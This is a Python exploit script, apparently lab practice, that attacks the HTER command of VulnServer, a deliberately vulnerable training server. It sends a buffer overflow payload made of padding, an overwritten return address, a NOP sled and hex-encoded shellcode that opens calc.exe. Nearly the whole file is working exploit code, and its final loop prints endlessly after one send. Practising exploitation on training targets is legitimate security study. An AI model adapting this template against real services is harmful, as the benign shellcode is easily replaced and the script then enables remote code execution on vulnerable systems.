#!/usr/bin/env python
#VulnServer HTER Exploit
#This command already converts whatever we send to hex, so only use alphanumeric values without any \x and it will already become hex
#See example calc buffer
#Author: HackerOnTwoWheels
import socket
import struct
import time
#Target
host="192.168.56.101"
port=9999

#Connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
	connect = s.connect((host,port))
	print "\n[*] Successfully connected to VulnServer at: " + host + " [*]"
except:
	print "\n[!]Vulnserver cannot be reached at: " + host + " [!]"
	print "\n[!]Please check if vulnserver is running on target host [!]"

#Payload
buffsize = 2016
header = "HTER 0"
padding = "A" * 2040

eip = "af115062"#0x625011af

#shell code to open calc.exe as PoC
nops = "90" * 4
buf = "31C9"                    # xor ecx,ecx
buf += "51"                     # push ecx
buf += "6863616C63"             # push 0x636c6163
buf += "54"                     # push dword ptr esp
buf += "B8C793C277"             # mov eax,0x77c293c7
buf += "FFD0"                   # call eax
buf += "C" * 200




payload = header + padding + eip + nops + buf
payload += "C" * (buffsize - len(payload))

#Send Payload and Exploit
count = 0
s.send(payload)
print "\n[*] Sending Payload to target [*]\n"
while True:
	count += 1
	
	print "[*] Sent: " + str(len(payload)) + " bytes " + str(count) + " times[*]\n"
	#time.sleep(2)
s.close()

